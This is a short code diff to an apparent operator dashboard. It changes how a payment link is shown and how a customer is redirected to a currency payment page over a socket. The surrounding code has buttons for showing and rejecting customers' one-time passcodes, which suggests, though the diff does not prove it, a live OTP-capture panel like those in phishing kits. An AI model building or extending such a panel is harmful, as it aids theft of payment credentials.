@@ -35,11 +35,11 @@
     .show-otp-btn:disabled { background: #666; }
     .wrong-otp-btn { background: #ef4444; }
     .wrong-otp-btn:hover { background: #dc2626; }
-    .reason-dropdown {
-      background: #333;
-      color: #fff;
-      border: 1px solid #555;
-      padding: 4px 8px;
+    .reason-dropdown { 
+      background: #333; 
+      color: #fff; 
+      border: 1px solid #555; 
+      padding: 4px 8px; 
       border-radius: 4px;
       width: 100%;
       margin-bottom: 5px;
@@ -406,10 +406,8 @@
           throw new Error(data.message || 'Failed to generate payment link');
         }
 
-        // Display the payment link in randomhash.html format instead of pay.my domain
-        const origin = window.location.origin;
-        const paymentLink = `${origin}/${data.paymentId}.html`;
-        document.getElementById('paymentLink').textContent = paymentLink;
+        // Use the payment link directly from the server response
+        document.getElementById('paymentLink').textContent = data.paymentLink;
         linkContainer.style.display = 'block';
         showMessage('success', 'Payment link generated successfully!');
       } catch (error) {
@@ -591,8 +589,9 @@
         }
 
         // Emit socket event to redirect the user
-        io.to(id).emit('redirect_to_currency', {
-          redirectUrl: `/currencypayment.html?pid=${data.pid}`
+        socket.emit('currency_redirect', {
+          invoiceId: id,
+          pid: data.pid
         });
 
         showMessage('success', 'Currency page shown to customer');
